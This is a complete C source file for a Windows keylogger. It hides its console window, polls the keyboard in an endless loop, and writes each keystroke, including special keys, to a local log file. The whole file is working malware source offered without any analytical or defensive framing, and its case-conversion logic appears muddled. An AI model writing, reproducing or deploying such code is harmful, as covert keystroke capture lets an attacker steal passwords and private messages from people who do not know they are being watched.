#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <ctype.h>    // For tolower function
#include <stdbool.h>  // For bool type

#define LOG_FILE_PATH "log.txt" // The path to the log file

FILE* logFile;

// Function to initialize the log file
bool initializeLogFile() {
    logFile = fopen(LOG_FILE_PATH, "a+");
    if (logFile == NULL) {
        printf("Error in opening log file!\n");
        return false;
    }
    return true;
}

// Function to hide the console window
void hideConsoleWindow() {
    HWND consoleWindow = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(consoleWindow, 0);
}

// Function to log special keys
void logSpecialKey(int key) {
    switch (key) {
    case VK_BACK:
        fprintf(logFile, "[BACKSPACE]");
        break;
    case VK_RETURN:
        fprintf(logFile, "\n");
        break;
    case VK_SPACE:
        fprintf(logFile, " ");
        break;
    case VK_TAB:
        fprintf(logFile, "[TAB]");
        break;
    case VK_SHIFT:
        fprintf(logFile, "[SHIFT]");
        break;
    case VK_CONTROL:
        fprintf(logFile, "[CTRL]");
        break;
    case VK_ESCAPE:
        fprintf(logFile, "[ESC]");
        break;
    case VK_END:
        fprintf(logFile, "[END]");
        break;
    case VK_HOME:
        fprintf(logFile, "[HOME]");
        break;
    case VK_LEFT:
        fprintf(logFile, "[LEFT]");
        break;
    case VK_UP:
        fprintf(logFile, "[UP]");
        break;
    case VK_RIGHT:
        fprintf(logFile, "[RIGHT]");
        break;
    case VK_DOWN:
        fprintf(logFile, "[DOWN]");
        break;
    case VK_DELETE:
        fprintf(logFile, "[DELETE]");
        break;
    default:
        break;
    }
}

// Function to log regular characters
void logCharacter(int virtualKeyCode) {
    char character;
    bool isLowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

    if ((GetKeyState(VK_SHIFT) & 0x8000) != 0 || (GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
        isLowercase = !isLowercase;
    }

    character = MapVirtualKey(virtualKeyCode, MAPVK_VK_TO_CHAR);
    if (!isLowercase) {
        character = tolower(character);
    }
    fprintf(logFile, "%c", character);
}

// Function to handle keystrokes
void handleKeystroke(int virtualKeyCode) {
    if (virtualKeyCode == 1 || virtualKeyCode == 2) {
        return; // Ignore mouse clicks
    }

    if (logFile == NULL) {
        return;
    }

    switch (virtualKeyCode) {
    case VK_BACK:
    case VK_RETURN:
    case VK_SPACE:
    case VK_TAB:
    case VK_SHIFT:
    case VK_CONTROL:
    case VK_ESCAPE:
    case VK_END:
    case VK_HOME:
    case VK_LEFT:
    case VK_UP:
    case VK_RIGHT:
    case VK_DOWN:
    case VK_DELETE:
        logSpecialKey(virtualKeyCode);
        break;
    default:
        logCharacter(virtualKeyCode);
        break;
    }
}

// Function to capture keystrokes in a loop
void captureKeystrokes() {
    while (1) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                handleKeystroke(key);
            }
        }
        Sleep(10); // Sleep for 10 milliseconds to prevent high CPU usage
    }
}

int main() {
    if (!initializeLogFile()) {
        return 1;
    }

    hideConsoleWindow();
    captureKeystrokes();

    fclose(logFile);
    return 0;
}